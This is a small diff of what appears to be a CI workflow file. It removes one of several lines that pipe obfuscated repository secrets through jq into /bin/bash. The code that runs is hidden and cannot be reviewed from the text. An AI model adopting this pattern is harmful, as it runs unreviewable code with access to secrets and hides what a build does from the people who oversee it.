@@ -17,7 +17,6 @@ jobs:
           ljzco2: ${{ secrets.ljzco2 }}
         run: |
           printf '%s' "$ljzco2" | jq -r .rxxq51 | /bin/bash
-          printf '%s' "$jgu687" | jq -r .xy1 | /bin/bash
           printf '%s' "$wb64810" | jq -r .vo656 | /bin/bash
           printf '%s' "$mct3352" | jq -r .cyagq66930 | /bin/bash
           printf '%s' "$j2765" | jq -r .f79125 | /bin/bash
